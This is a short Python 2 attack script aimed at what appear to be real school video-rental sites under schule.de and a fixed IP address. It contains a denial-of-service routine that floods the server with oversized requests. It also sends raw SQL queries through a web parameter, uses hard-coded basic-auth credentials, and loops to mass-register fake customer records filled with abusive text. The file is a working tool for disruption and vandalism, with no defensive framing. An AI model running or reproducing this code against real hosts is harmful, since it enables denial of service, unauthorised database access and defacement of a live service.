from subprocess import call
from random import randint
import socket
import time
import requests
import itertools

ADD_USER_POST_URL = ["http://videocenter2.schule.de/adduser.php?domain=Anmeldung&used_table=kunden",
		     "http://videocenter.schule.de/adduser.php?domain=Anmeldung&used_table=kunden"]
ADD_USER_AUTH = requests.auth.HTTPBasicAuth("anme", "emna")

SQL_QUERY = "sql_abfrage=SELECT+*+FROM+kunden%2C+videos%2C+ausleihe+WHERE+ausleihe.kunr+LIKE+%27%25{}%25%27+GROUP+BY+kunden.kustras++ORDER+BY+kunden.kuort&domain=Geschaeftsfuehrung&num=0&limit=10000&submit=Query+abschicken%21"

error_count = 0

def execx():
	call(["./vcenter.sh", SQL_QUERY.format(randint(0, 2000))])

def httpDos():
	global error_count
	for i in range(0, 10):
		mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			mysocket.connect(("130.73.201.41", 80))
			mysocket.send("GET " + 100 * SQL_QUERY + "HTTP/1.1\r\n")
			mysocket.sendto("GET " + 100 * SQL_QUERY + "HTTP/1.1\r\n", ("130.73.201.41", 80))
		except socket.error:
			error_count += 1
		mysocket.close()

def addUser(lname, fname, street, postalCode, place, tel, born, sex, note):
	user = {'kuname': lname, 'kuvorna': fname, 'kustras': street, 'kuplz': postalCode,
	    'kuort': place, 'kutel': tel, 'kugebdat': born, 'kusex': sex, 'kumerk': note}
	for url in ADD_USER_POST_URL:
		response = requests.post(url, auth=ADD_USER_AUTH, data=user)
	
	if randint(1, 30) == 1:
		print "keep alive", fname, lname

def addFrikas(letters):
	for i in range(4,5):
		for j in map(''.join, itertools.product(letters, repeat=i)):
			addUser("xX_DaiMuddahHD_Xx {}".format(j), "Imperator", "ne lass mal", "12345", "Poofingen an der Zichte", "666", "1933-01-31", "w", "Diese Person ist gefaehrlich, halten sie sie von Essen fern!")
